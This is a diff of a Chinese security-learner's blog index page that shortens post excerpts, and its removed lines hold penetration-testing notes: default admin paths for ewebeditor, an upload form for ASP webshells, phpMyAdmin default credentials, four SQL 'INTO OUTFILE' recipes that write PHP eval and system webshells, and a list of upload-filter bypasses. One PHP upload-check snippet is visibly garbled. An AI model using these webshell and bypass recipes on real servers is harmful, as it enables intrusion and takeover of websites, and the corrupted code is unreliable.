@@ -261,7 +261,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">发表于</span>
+            <span class="post-meta-item-text">更新于</span>
             <time itemprop="dateCreated" datetime="2016-07-27T08:35:38+08:00" content="2016-07-27">
               2016-07-27
             </time>
@@ -291,29 +291,7 @@
 
       
         
-          <h3 id="对文件上传简直就是疯了，谷歌语法，各种上传漏洞，上传绕过，对这几天的笔记做的总结。"><a href="#对文件上传简直就是疯了，谷歌语法，各种上传漏洞，上传绕过，对这几天的笔记做的总结。" class="headerlink" title="对文件上传简直就是疯了，谷歌语法，各种上传漏洞，上传绕过，对这几天的笔记做的总结。"></a>对文件上传简直就是疯了，谷歌语法，各种上传漏洞，上传绕过，对这几天的笔记做的总结。</h3><h2 id="编辑器漏洞总结"><a href="#编辑器漏洞总结" class="headerlink" title="编辑器漏洞总结"></a>编辑器漏洞总结</h2><ul>
-<li>常见编辑器：</li>
-</ul>
-<p>ewebeditor<br>SouthidcEditor<br>fckeditor<br>CuteEditor<br>freetextbox</p>
-<h2 id="0x01-ewebeditor编辑器："><a href="#0x01-ewebeditor编辑器：" class="headerlink" title="0x01 ewebeditor编辑器："></a>0x01 ewebeditor编辑器：</h2><p>默认后台:</p>
-<pre><code>http://127.0.0.1/ewebeditor/admin_login.asp
-http://127.0.0.1/ewebeditor/admin/login.asp
-</code></pre><p>默认数据库：</p>
-<pre><code>http://127.0.0.1/ewebeditor/db/ewebeditor.mdb
-http://127.0.0.1/ewebeditor/db/%23ewebeditor.mdb
-</code></pre><p>有一个版本的密码是在配置文件中</p>
-<pre><code>http://127.0.0.1/ewebeditor/admin/config.asp
-</code></pre><p>进入编辑器，上传asa或者asp，得到webshell，也可以本地构造一个html进行上传</p>
-<pre><code>&lt;form action=”http://127.0.0.1/ewebditor/upload.asp?action=save&amp;type=&amp;style=样式名” method=post name=myform enctype=”multipart/form-data”&gt;
-&lt;input type=file name=uploadfile size=1 style=”width:100%”&gt;
-&lt;input type=submit value=”上传了”&gt;&lt;/input&gt;
-&lt;/form&gt;
-</code></pre><p>利用： </p>
-<ul>
-<li>后台如果能进入</li>
-<li>可点击样式管理</li>
-</ul>
-<p>standard 拷贝一份(直接修改改不了名字可以随便)<br>在拷贝的一份里加入图片类型( asa cer aaspsp )，然后点预览，在编辑器里点设计，然后直接上传asa大马，上传后，右键查看源代码就可以看到OO的位置!<br>(原理:因为在iis里 网站的属性里 应用程序配置一项   asa扩展名还是用asp.dll来解析的,asp也是,还有cer/cdx)</p>
+          <h3 id="对文件上传简直就是疯了，谷歌语法，各种上传漏洞，上传绕过，对这几天的笔记做的总结。"><a href="#对文件上传简直就是疯了，谷歌语法，各种上传漏洞，上传绕过，对这几天的笔记做的总结。" class="headerlink" title="对文件上传简直就是疯了，谷歌语法，各种上传漏洞，上传绕过，对这几天的笔记做的总结。"></a>对文件上传简直就是疯了，谷歌语法，各种上传漏洞，上传绕过，对这几天的笔记做的总结。</h3>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/07/27/19/#more" rel="contents">
               阅读全文 &raquo;
@@ -379,7 +357,7 @@ http://127.0.0.1/ewebeditor/db/%23ewebeditor.mdb
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">发表于</span>
+            <span class="post-meta-item-text">更新于</span>
             <time itemprop="dateCreated" datetime="2016-07-04T20:17:37+08:00" content="2016-07-04">
               2016-07-04
             </time>
@@ -409,51 +387,12 @@ http://127.0.0.1/ewebeditor/db/%23ewebeditor.mdb
 
       
         
-          
-            <h3 id="最近学习状态有点不太好，原因就是老师一再要求看乌云Drops上文章，其实之前都看过很多的，只是基础的原因，并不是看的很懂、而且很吃力。最近更是没法说，学的多一点，发现要学的也是多一点，好生气。"><a href="#最近学习状态有点不太好，原因就是老师一再要求看乌云Drops上文章，其实之前都看过很多的，只是基础的原因，并不是看的很懂、而且很吃力。最近更是没法说，学的多一点，发现要学的也是多一点，好生气。" class="headerlink" title="最近学习状态有点不太好，原因就是老师一再要求看乌云Drops上文章，其实之前都看过很多的，只是基础的原因，并不是看的很懂、而且很吃力。最近更是没法说，学的多一点，发现要学的也是多一点，好生气。"></a>最近学习状态有点不太好，原因就是老师一再要求看乌云Drops上文章，其实之前都看过很多的，只是基础的原因，并不是看的很懂、而且很吃力。最近更是没法说，学的多一点，发现要学的也是多一点，好生气。</h3><h3 id="没法了，只有不断的学呗，于是就生成一个淫荡的主意，把别人写好的文章下到本地，想什么时候看都可以。就开始上网看看Drops的源代码，之前写过类似的，还是比较轻松的，噼里啪啦一顿敲，完美收工。看看运行的结果不是很理想，就想着是不是要优化一下，又是噼里啪啦一顿敲，基本可以看，但还可以优化。"><a href="#没法了，只有不断的学呗，于是就生成一个淫荡的主意，把别人写好的文章下到本地，想什么时候看都可以。就开始上网看看Drops的源代码，之前写过类似的，还是比较轻松的，噼里啪啦一顿敲，完美收工。看看运行的结果不是很理想，就想着是不是要优化一下，又是噼里啪啦一顿敲，基本可以看，但还可以优化。" class="headerlink" title="没法了，只有不断的学呗，于是就生成一个淫荡的主意，把别人写好的文章下到本地，想什么时候看都可以。就开始上网看看Drops的源代码，之前写过类似的，还是比较轻松的，噼里啪啦一顿敲，完美收工。看看运行的结果不是很理想，就想着是不是要优化一下，又是噼里啪啦一顿敲，基本可以看，但还可以优化。"></a>没法了，只有不断的学呗，于是就生成一个淫荡的主意，把别人写好的文章下到本地，想什么时候看都可以。就开始上网看看Drops的源代码，之前写过类似的，还是比较轻松的，噼里啪啦一顿敲，完美收工。看看运行的结果不是很理想，就想着是不是要优化一下，又是噼里啪啦一顿敲，基本可以看，但还可以优化。</h3><h3 id="每一篇文章考虑到有额外的连接，照片的连接，首先想到是吧照片下载下来，后来觉得麻烦，拜拜，还是保持原有连接吧。"><a href="#每一篇文章考虑到有额外的连接，照片的连接，首先想到是吧照片下载下来，后来觉得麻烦，拜拜，还是保持原有连接吧。" class="headerlink" title="每一篇文章考虑到有额外的连接，照片的连接，首先想到是吧照片下载下来，后来觉得麻烦，拜拜，还是保持原有连接吧。"></a>每一篇文章考虑到有额外的连接，照片的连接，首先想到是吧照片下载下来，后来觉得麻烦，拜拜，还是保持原有连接吧。</h3><pre><code>def get_url(PageListUrls):
-   PageUrls = []
-   for url in PageListUrls:
-       patt = re.compile(r&quot;&lt;h2 class=\&quot;entry-title\&quot;&gt;&lt;a href=\&quot;(.*?)\&quot; rel=\&quot;bookmark\&quot; title=\&quot;.*?\&quot;&gt;.*?&lt;/a&gt;&lt;/h2&gt;&quot;)
-       content = requests.get(url)
-       article = patt.findall(content.text)
-       for aurl in article:
-           PageUrls.append(aurl)
-   return PageUrls
-</code></pre><h3 id="我的目的就是想在本地看的舒服，就按源码的形式保存下来，在本地也以html静态页面格式的保存，于是就写以下代码，获取文章的主要信息（标题、作者、内容等）"><a href="#我的目的就是想在本地看的舒服，就按源码的形式保存下来，在本地也以html静态页面格式的保存，于是就写以下代码，获取文章的主要信息（标题、作者、内容等）" class="headerlink" title="我的目的就是想在本地看的舒服，就按源码的形式保存下来，在本地也以html静态页面格式的保存，于是就写以下代码，获取文章的主要信息（标题、作者、内容等）"></a>我的目的就是想在本地看的舒服，就按源码的形式保存下来，在本地也以html静态页面格式的保存，于是就写以下代码，获取文章的主要信息（标题、作者、内容等）</h3><pre><code>def get_content(PageUrls):
-   for url in PageUrls:
-       #抓取页面
-       req = requests.get(url)
-       content = req.text
-       #获取标题
-       patt_title = re.compile(r&quot;&lt;h1 class=\&quot;entry-title ng-binding\&quot;&gt;(.*?)&lt;/h1&gt;&quot;)
-       title = patt_title.findall(content)
-       #获取作者
-       path_author = re.compile(r&quot;&lt;a href=\&quot;/author/.*?\&quot; class=\&quot;title ng-binding\&quot;&gt;(.*?)&lt;/a&gt;&quot;)
-       author = path_author.findall(content)
-       #获取文章内容
-       path_section = re.compile(r&quot;&lt;section class=\&quot;entry-content ng-binding\&quot; ng-bind-html=\&quot;postContentTrustedHtml\&quot;&gt;([\w\W]*?)&lt;/section&gt;&quot;)
-       section = path_section.findall(content)
-       #采集数据缓到本地
-       cache_Articles(url,title[0],author[0],section[0])
-</code></pre><h3 id="本来基本搞定了，可以按照预想的爬到所有的文章保存到本地，由于Drops上文章很多，加上所处环境渣的要命，整整搞了半小时才搞完，没办法，就想到了线程，有进一步的对代码进行优化，整理了一下多线程的代码，这次嗖嗖的快了很多，此时确实感觉python还可以，就是各种乱搞好不好。"><a href="#本来基本搞定了，可以按照预想的爬到所有的文章保存到本地，由于Drops上文章很多，加上所处环境渣的要命，整整搞了半小时才搞完，没办法，就想到了线程，有进一步的对代码进行优化，整理了一下多线程的代码，这次嗖嗖的快了很多，此时确实感觉python还可以，就是各种乱搞好不好。" class="headerlink" title="本来基本搞定了，可以按照预想的爬到所有的文章保存到本地，由于Drops上文章很多，加上所处环境渣的要命，整整搞了半小时才搞完，没办法，就想到了线程，有进一步的对代码进行优化，整理了一下多线程的代码，这次嗖嗖的快了很多，此时确实感觉python还可以，就是各种乱搞好不好。"></a>本来基本搞定了，可以按照预想的爬到所有的文章保存到本地，由于Drops上文章很多，加上所处环境渣的要命，整整搞了半小时才搞完，没办法，就想到了线程，有进一步的对代码进行优化，整理了一下多线程的代码，这次嗖嗖的快了很多，此时确实感觉python还可以，就是各种乱搞好不好。</h3><pre><code>j = 0
-for i in range(0,len(PageUrls)):
-    if j % ThreadExceNum == 0:
-        #加入线程
-        t1 = threading.Thread(target=get_article_content,args=(PageUrlGroup,))
-        threads.append(t1)
-        PageUrlGroup = []
-    else:
-        PageUrlGroup.append(PageUrls[i])
-    j = j + 1
-for t in threads:
-    try:
-        t.setDaemon(True)
-        t.start()
-    except Exception,ex:
-        print &quot;something error!&quot;
-t.join()
-</code></pre><h3 id="基本核心代码就是这些，找到链接及可变参数，获取到总共的页数进行循环访问，再进行匹配分析，然后保存到本地，over！感觉也没什么可解释的，一个简单的小脚本，就当练习一下。"><a href="#基本核心代码就是这些，找到链接及可变参数，获取到总共的页数进行循环访问，再进行匹配分析，然后保存到本地，over！感觉也没什么可解释的，一个简单的小脚本，就当练习一下。" class="headerlink" title="基本核心代码就是这些，找到链接及可变参数，获取到总共的页数进行循环访问，再进行匹配分析，然后保存到本地，over！感觉也没什么可解释的，一个简单的小脚本，就当练习一下。"></a>基本核心代码就是这些，找到链接及可变参数，获取到总共的页数进行循环访问，再进行匹配分析，然后保存到本地，over！感觉也没什么可解释的，一个简单的小脚本，就当练习一下。</h3>
-          
+          <h3 id="最近学习状态有点不太好，原因就是老师一再要求看乌云Drops上文章，其实之前都看过很多的，只是基础的原因，并不是看的很懂、而且很吃力。最近更是没法说，学的多一点，发现要学的也是多一点，好生气。"><a href="#最近学习状态有点不太好，原因就是老师一再要求看乌云Drops上文章，其实之前都看过很多的，只是基础的原因，并不是看的很懂、而且很吃力。最近更是没法说，学的多一点，发现要学的也是多一点，好生气。" class="headerlink" title="最近学习状态有点不太好，原因就是老师一再要求看乌云Drops上文章，其实之前都看过很多的，只是基础的原因，并不是看的很懂、而且很吃力。最近更是没法说，学的多一点，发现要学的也是多一点，好生气。"></a>最近学习状态有点不太好，原因就是老师一再要求看乌云Drops上文章，其实之前都看过很多的，只是基础的原因，并不是看的很懂、而且很吃力。最近更是没法说，学的多一点，发现要学的也是多一点，好生气。</h3>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/07/04/18/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -514,7 +453,7 @@ t.join()
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">发表于</span>
+            <span class="post-meta-item-text">更新于</span>
             <time itemprop="dateCreated" datetime="2016-07-02T20:43:48+08:00" content="2016-07-02">
               2016-07-02
             </time>
@@ -629,7 +568,7 @@ end if
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">发表于</span>
+            <span class="post-meta-item-text">更新于</span>
             <time itemprop="dateCreated" datetime="2016-07-02T20:20:40+08:00" content="2016-07-02">
               2016-07-02
             </time>
@@ -659,23 +598,7 @@ end if
 
       
         
-          <h2 id="0x00-linux"><a href="#0x00-linux" class="headerlink" title="0x00 linux"></a>0x00 linux</h2><p>解析格式：1.php.xxx (xxx可以是任意)<br>如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。<br>辨别linux系统方法，例如：<a href="http://www.xxx.com/xxx/abc.asp?id=125">http://www.xxx.com/xxx/abc.asp?id=125</a> 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统</p>
-<h2 id="0x01-旁注"><a href="#0x01-旁注" class="headerlink" title="0x01 旁注"></a>0x01 旁注</h2><p>旁注的技巧就是挑选支持aspx的站来日，这样提权时候希望较大，如何探测服务器上哪些站点支持aspx呢? 利用bing搜索：<a href="http://cn.bing.com/">http://cn.bing.com/</a> 搜索格式：ip:服务器ip aspx<br>比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx.aspx回车，如果显示的不是iis默认的错误页面，而是这种：“/”应用程序中的服务器错误，说明支持aspx马。</p>
-<h2 id="0x02-phpmyadmin"><a href="#0x02-phpmyadmin" class="headerlink" title="0x02 phpmyadmin"></a>0x02 phpmyadmin</h2><p>查看版本：test.php 或 phpinfo.php<br>默认账号密码：root root<br>万能帐号密码：’localhost’@’@” 密码空<br>拿shell第一种方法：</p>
-<pre><code>CREATE TABLE `mysql`.`darkmoon` (`darkmoon1` TEXT NOT NULL );
-INSERT INTO `mysql`.`darkmoon` (`darkmoon1` ) VALUES (&apos;&lt;?php @eval($_POST[pass]);?&gt;&apos;);
-SELECT `darkmoon1` FROM `darkmoon` INTO OUTFILE &apos;d:/wamp/www/darkmoon.php&apos;;
-DROP TABLE IF EXISTS `darkmoon`;
-</code></pre><p>拿shell第二种方法：</p>
-<pre><code>Create TABLE moon (darkmoon text NOT NULL);
-Insert INTO moon (darkmoon) VALUES(&apos;&lt;?php @eval($_POST[pass]);?&gt;&apos;);
-select darkmoon from moon into outfile &apos;d:/wamp/www/darkmoon2.php&apos;;
-Drop TABLE IF EXISTS moon;
-</code></pre><p>拿shell第三种方法：</p>
-<pre><code>select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos;INTO OUTFILE &apos;d:/wamp/www/darkmoon3.php&apos;
-</code></pre><p>拿shell第四种方法</p>
-<pre><code>select &apos;&lt;?php echo \&apos;&lt;pre&gt;\&apos;;system($_GET[\&apos;cmd\&apos;]); echo \&apos;&lt;/pre&gt;\&apos;; ?&gt;&apos; INTO OUTFILE &apos;d:/wamp/www/darkmoon4.php&apos;
-</code></pre><p>127.0.0.1/darkmoon4.php?cmd=net user<br>找到mysql数据库，执行sql语句即可写入一句话，再菜刀连接即可。<br>phpmyadmin脱裤：在这里面是可以直接拖库的，如同上传php拖库脚本一样，操作差不多的。<br>修改mysql默认的root用户名方法:<br>进入phpmyadmin,进入mysql表,执行sql语句<br>         1.update user set user=’你的新root用户名’ where user=’root’;<br>         2.flush privileges;<br>例如：<br>用root身份登入，进入mysql库，修改user表即可。<br>         1.use mysql;<br>         2.mysql&gt;update user set user=’newName’ where user=’root’;<br>         3.mysql&gt; flush privileges;   </p>
+          <h2 id="0x00-linux"><a href="#0x00-linux" class="headerlink" title="0x00 linux"></a>0x00 linux</h2><p>解析格式：1.php.xxx (xxx可以是任意)<br>如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。<br>辨别linux系统方法，例如：<a href="http://www.xxx.com/xxx/abc.asp?id=125">http://www.xxx.com/xxx/abc.asp?id=125</a> 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统<br>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/07/02/15/#more" rel="contents">
               阅读全文 &raquo;
@@ -741,7 +664,7 @@ Drop TABLE IF EXISTS moon;
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">发表于</span>
+            <span class="post-meta-item-text">更新于</span>
             <time itemprop="dateCreated" datetime="2016-07-02T20:20:38+08:00" content="2016-07-02">
               2016-07-02
             </time>
@@ -771,7 +694,7 @@ Drop TABLE IF EXISTS moon;
 
       
         
-          <h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><h3 id="学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状态不是很好，就想起了是不是要总结这样一份文章。说就干，大概发费了2天左右的时间，最后经过整理准备分3部分写。平时看着都挺熟悉的东西，总结下来，是这么的没有思路，做总结过程中，怀疑过自己是不是鱼的记忆（听说过这样一句话：鱼的记忆只有3秒钟），忘得太快。这也许就是我们这一代人中有一小部分人的通病，喜欢好高骛远。。。"><a href="#学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状态不是很好，就想起了是不是要总结这样一份文章。说就干，大概发费了2天左右的时间，最后经过整理准备分3部分写。平时看着都挺熟悉的东西，总结下来，是这么的没有思路，做总结过程中，怀疑过自己是不是鱼的记忆（听说过这样一句话：鱼的记忆只有3秒钟），忘得太快。这也许就是我们这一代人中有一小部分人的通病，喜欢好高骛远。。。" class="headerlink" title="学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状态不是很好，就想起了是不是要总结这样一份文章。说就干，大概发费了2天左右的时间，最后经过整理准备分3部分写。平时看着都挺熟悉的东西，总结下来，是这么的没有思路，做总结过程中，怀疑过自己是不是鱼的记忆（听说过这样一句话：鱼的记忆只有3秒钟），忘得太快。这也许就是我们这一代人中有一小部分人的通病，喜欢好高骛远。。。"></a>学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状态不是很好，就想起了是不是要总结这样一份文章。说就干，大概发费了2天左右的时间，最后经过整理准备分3部分写。平时看着都挺熟悉的东西，总结下来，是这么的没有思路，做总结过程中，怀疑过自己是不是鱼的记忆（听说过这样一句话：鱼的记忆只有3秒钟），忘得太快。这也许就是我们这一代人中有一小部分人的通病，喜欢好高骛远。。。</h3><h3 id="总结的不是多么的好，也许看起来不是太有条理，知识为了让自己以后看以来方便一点，仅此而已，都是网上别人写的加上点自己理解。"><a href="#总结的不是多么的好，也许看起来不是太有条理，知识为了让自己以后看以来方便一点，仅此而已，都是网上别人写的加上点自己理解。" class="headerlink" title="总结的不是多么的好，也许看起来不是太有条理，知识为了让自己以后看以来方便一点，仅此而已，都是网上别人写的加上点自己理解。"></a>总结的不是多么的好，也许看起来不是太有条理，知识为了让自己以后看以来方便一点，仅此而已，都是网上别人写的加上点自己理解。</h3><h2 id="0x00-上传部分"><a href="#0x00-上传部分" class="headerlink" title="0x00 上传部分"></a>0x00 上传部分</h2><p>1.直接上传asp asa jsp cer php aspx htr cdx 格式的木马，不行就利用IIS6.0解析漏洞”:1.asp;1.jpg/1.asp;.jpg/1.asp;jpg/1.asp;.xls<br>2.上传图片木马遇到拦截系统，连图片木马都上传不了，记事本打开图片木马在代码最前面加上gif89a，一般就能逃过拦截系统了。<br>3.上传图片木马把地址复制到数据库备份里备份成asp木马，有时不成功就利用IIs6.0解析漏洞尝试突破。<br>4.上传图片木马再用抓包工具进行抓包，用明小子的综合上传功能，复制上传地址及cookies填到对应的框里，点击上传即可。<br>5.当后台有数据库备份蛋没有上传点时，把一句话木马插到任意处，再到数据库备份里备份成asp木马，之后用一句话客户端连接木马即可。<br>6.后台点击修改密码，新密码设置为：1”:eval request(“h”)’设置成功后连接asp/config.asp即可拿下shell<br>7.当页面提示“上传格式不正确[重新上传]” 则说明存在上传漏洞，复制地址放到明小子里上传，一般都能直接拿下shell。<br>8.当后台没有数据库备份但有数据库恢复的情况下，请不要犹豫，数据库恢复跟数据库备份功能是一样的，直接邪恶吧。<br>9.如果知道网站的数据库是asp的，直接在前台找留言板插入一句话木马，连接配置文件inc/config.asp即可拿下shell。<br>10.当网站前台有“会员注册” 注册一个账户进去看看有没有上传点，有的话直接上传asp木马以及利用iis6.0解析漏洞，不行就抓包用明小子上传。<br>11.先上传一个.ashx的文件，在笔记里搜索可找到方法，结果是访问会生成一句话木马文件，后台上传、编辑器上传、上传漏洞页面均可使用此方法。<br>12.当页面提示只能上传jpg|gif|png等格式的时候，右键查看源文件，本地修改为asp|asa|php再本地上传即可拿下shell。<br>13.当用啊D检测注入点提示SA权限或DB权限的时候，尝试列目录找到网站物理路径，再点击cmd/上传，直接上传asp木马即可，不行就差异备份拿shell。<br>14.对于一些上传漏洞的上传页面，以及后台找到的上传页面，可以尝试用本地双文件上传突破，第一个选jpg第二个选cer，推荐使用火狐浏览器。</p>
+          <h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><h3 id="学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状态不是很好，就想起了是不是要总结这样一份文章。说就干，大概发费了2天左右的时间，最后经过整理准备分3部分写。平时看着都挺熟悉的东西，总结下来，是这么的没有思路，做总结过程中，怀疑过自己是不是鱼的记忆（听说过这样一句话：鱼的记忆只有3秒钟），忘得太快。这也许就是我们这一代人中有一小部分人的通病，喜欢好高骛远。。。"><a href="#学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状态不是很好，就想起了是不是要总结这样一份文章。说就干，大概发费了2天左右的时间，最后经过整理准备分3部分写。平时看着都挺熟悉的东西，总结下来，是这么的没有思路，做总结过程中，怀疑过自己是不是鱼的记忆（听说过这样一句话：鱼的记忆只有3秒钟），忘得太快。这也许就是我们这一代人中有一小部分人的通病，喜欢好高骛远。。。" class="headerlink" title="学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状态不是很好，就想起了是不是要总结这样一份文章。说就干，大概发费了2天左右的时间，最后经过整理准备分3部分写。平时看着都挺熟悉的东西，总结下来，是这么的没有思路，做总结过程中，怀疑过自己是不是鱼的记忆（听说过这样一句话：鱼的记忆只有3秒钟），忘得太快。这也许就是我们这一代人中有一小部分人的通病，喜欢好高骛远。。。"></a>学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状态不是很好，就想起了是不是要总结这样一份文章。说就干，大概发费了2天左右的时间，最后经过整理准备分3部分写。平时看着都挺熟悉的东西，总结下来，是这么的没有思路，做总结过程中，怀疑过自己是不是鱼的记忆（听说过这样一句话：鱼的记忆只有3秒钟），忘得太快。这也许就是我们这一代人中有一小部分人的通病，喜欢好高骛远。。。</h3>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/07/02/16/#more" rel="contents">
               阅读全文 &raquo;
@@ -837,7 +760,7 @@ Drop TABLE IF EXISTS moon;
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">发表于</span>
+            <span class="post-meta-item-text">更新于</span>
             <time itemprop="dateCreated" datetime="2016-06-26T17:53:40+08:00" content="2016-06-26">
               2016-06-26
             </time>
@@ -867,29 +790,7 @@ Drop TABLE IF EXISTS moon;
 
       
         
-          <h2 id="0x00-web上传漏洞原理"><a href="#0x00-web上传漏洞原理" class="headerlink" title="0x00 web上传漏洞原理"></a>0x00 web上传漏洞原理</h2><p>JavaScript检查漏洞、临时文件上传漏洞、文件扩展名检查漏洞、Apache解析文件漏洞、Ngixn解析文件漏洞、.htaccess文件攻击、0x00截断绕过漏洞、文件名大小写绕过漏洞、文件大小数量检查漏洞等<br>1）没有对上传文件的类型做检测<br>2）没有对上传文件的大小和数量做检测<br>3）没有对上传文件的扩展名做检测<br>4）使用上传的文件名作为最终存储的文件名<br>5）服务器端缺乏相应的安全配置，给予上传目录执行权限等<br>6）Apache、MySQL等服务器组件没有对用户账号的权限进行限制<br>7）Apache、MySQL等服务器组件没有及时升级</p>
-<h2 id="0x01-上传流程"><a href="#0x01-上传流程" class="headerlink" title="0x01 上传流程"></a>0x01 上传流程</h2><p>文字图示：<br>PC主机(javascript检测) —-&gt; http POST请求 —-&gt; 服务器(MIME、目录路径、文件扩展名、文件内容等检测)<br>服务器端检测：<br>A 客户端 javascript 检测 (通常为检测文件扩展名)<br>B 服务端 MIME 类型检测 (检测 Content-Type 内容)<br>C 服务端目录路径检测 (检测跟 path 参数相关的内容)<br>D 服务端文件扩展名检测 (检测跟文件 extension 相关的内容)<br>E 服务端文件内容检测 (检测内容是否合法或含有恶意代码)<br>文件上传流程：<br>①文件以http协议上传，将以 POST 请求发送至 web 服务器<br>②web 服务器接收到请求后并同意后，用户与 web 服务器将建立连接，并传输数据。</p>
-<h3 id="A-客户端端验证绕过-javascript-扩展名检测"><a href="#A-客户端端验证绕过-javascript-扩展名检测" class="headerlink" title="A 客户端端验证绕过(javascript 扩展名检测)"></a>A 客户端端验证绕过(javascript 扩展名检测)</h3><p>  用反向代理工具(burp 之类)或禁用 js 便可以绕过客户端端验证</p>
-<h3 id="B-服务端验证绕过-http-request-包检测"><a href="#B-服务端验证绕过-http-request-包检测" class="headerlink" title="B 服务端验证绕过(http request 包检测)"></a>B 服务端验证绕过(http request 包检测)</h3><ul>
-<li><p>Content-type (Mime type) 检测<br> 用反向代理工具(burp 之类)进行 Content-type 伪造</p>
-<pre><code>&lt;!-- 修改 ：Content-Type:image/gif ( 原为 : Content-Type:text/plain) --&gt;
-&lt;?php  
-if($_FILES[&apos;userfile&apos;][&apos;type&apos;] = != ) &quot;image/gif&quot;) {
-// 检测 Content-type
-echo , &quot;Sorry, e we y only w allow g uploading F GIF  images&quot;;
-exit;
-}
-$uploaddir = =  &apos;uploads/&apos;;
-$uploadfile = = r $uploaddir . .  basename($_FILES[&apos;userfile&apos;][&apos;name&apos;]);
-if , (move_uploaded_file($_FILES[&apos;userfile&apos;][&apos;tmp_name&apos;], ) $uploadfile)) {
-echo &quot;File s is , valid, d and s was y successfully  uploaded.\n&quot;;
-} else {
-echo  &quot;File g uploading  failed.\n&quot;;
-}
-
-?&gt;
-</code></pre></li>
-</ul>
+          <h2 id="0x00-web上传漏洞原理"><a href="#0x00-web上传漏洞原理" class="headerlink" title="0x00 web上传漏洞原理"></a>0x00 web上传漏洞原理</h2><p>JavaScript检查漏洞、临时文件上传漏洞、文件扩展名检查漏洞、Apache解析文件漏洞、Ngixn解析文件漏洞、.htaccess文件攻击、0x00截断绕过漏洞、文件名大小写绕过漏洞、文件大小数量检查漏洞等<br>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/06/26/14/#more" rel="contents">
               阅读全文 &raquo;
@@ -955,7 +856,7 @@ echo  &quot;File g uploading  failed.\n&quot;;
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">发表于</span>
+            <span class="post-meta-item-text">更新于</span>
             <time itemprop="dateCreated" datetime="2016-06-14T15:33:42+08:00" content="2016-06-14">
               2016-06-14
             </time>
@@ -985,16 +886,7 @@ echo  &quot;File g uploading  failed.\n&quot;;
 
       
         
